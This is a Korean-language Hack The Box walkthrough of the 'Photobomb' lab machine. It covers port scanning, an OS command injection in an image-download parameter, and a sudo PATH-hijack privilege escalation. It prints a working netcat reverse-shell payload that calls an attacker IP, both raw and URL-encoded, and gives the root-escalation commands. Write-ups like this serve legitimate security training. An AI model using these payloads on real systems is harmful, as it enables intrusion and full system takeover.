---
title: "[Hack The Box] Photobomb 풀이"
categories:
  - Hack-The-Box
tags:
  - HTB
  - Hack The Box
  - Photobomb
toc: true
toc_sticky: true
toc_label: "Photobomb 풀이"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/hackthebox.jpeg
---

💡 Hack-The-Box Photobomb 풀이 입니다.
{: .notice--warning}

# 문제

![image](https://user-images.githubusercontent.com/33647663/219938714-11872e62-dc99-4652-93ff-70dcf5bc56ff.png)


# Enumeration

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─ nmap -sV -p - -vv --min-rate 3000 10.129.228.60
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-19 03:09 EST
Discovered open port 22/tcp on 10.129.228.60
Discovered open port 80/tcp on 10.129.228.60
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 42.79 seconds
           Raw packets sent: 86968 (3.827MB) | Rcvd: 80330 (3.213MB)


```



# HTTP
![image](https://user-images.githubusercontent.com/33647663/219938887-9ce22de5-488a-4b04-afb2-e7689213f24d.png)

소스코드를 확인해봅니다.

![image](https://user-images.githubusercontent.com/33647663/219938902-365bc112-d749-40aa-93f3-a363d8be223a.png)

```photobomb.js``` 스크립트 파일을 살펴보면 다음과 같이 id,pw를 알 수 있습니다.

![image](https://user-images.githubusercontent.com/33647663/219938914-8257f7a0-756a-4868-a248-e9ff658247aa.png)

해당 사이트는 이미지를 다운로드 하는 기능이 존재합니다.

![image](https://user-images.githubusercontent.com/33647663/219938953-e15f3f2a-97ae-4ead-ab9c-c0a768d0d09a.png)

이미지를 다운로드 하기 위해 서버로 보내지는 매개변수들을 조작하기 위해서 burpsuite로 패킷을 잡습니다.

![image](https://user-images.githubusercontent.com/33647663/219939024-d1f70f50-8487-4a67-9f03-57f386f4c619.png)

파일의 이름(photo), 확장자(jpg), 해상도(dimensions)를 사용자의 입력값을 통해서 처리합니다. 

파일 다운로드 취약점이나, 확장자를 변환해주는 기능이 있기 때문에 OS Command Injection 취약점이 존재하는지 확인해 봅니다. 

filetype부분에서 ```OS Command Injection``` 취약점이 존재합니다.

filetype값을 다음과 같이 입력하여 reverse shell을 획득합니다.

```bash
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 1234 >/tmp/f
filetype=jpg;rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.14.7+1234+%3e%2ftmp%2ff
```

![image](https://user-images.githubusercontent.com/33647663/219939436-f1620b21-ba0b-4513-a17c-75275c69d6f8.png)

# Privilege Escalation

![image](https://user-images.githubusercontent.com/33647663/219939467-16564e5b-34fd-463d-9f25-18afe0d2de5e.png)

```sh
(root) : root 권한으로 실행 가능
SETENV : sudo 명령어를 실행하면서 환경변수를 수정가능
NOPASSWD : sudo 명령어를 실행할때, 해당 계정의 비밀번호 필요 x
/opt/cleanup.sh : 해당 파일을 sudo 명령어로 수행가능
```

/opt/cleanup.sh 파일을 확인해 봅니다.

```sh
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

root 권한으로 위의 쉘 스크립트를 수행합니다. 환경변수를 바꿀 수 있기 때문에 ```PATH```환경변수를 조작하여, find 명령어를 bash로 바꾸어 주면 root 권한 획득이 가능합니다.

```bash
cd /tmp
echo "bash" > find
chmod 777 find
sudo -u root PATH=/tmp:$PATH /opt/cleanup.sh
```

![image](https://user-images.githubusercontent.com/33647663/219939676-7cc814fc-690d-45a6-b518-05f7b0838f95.png)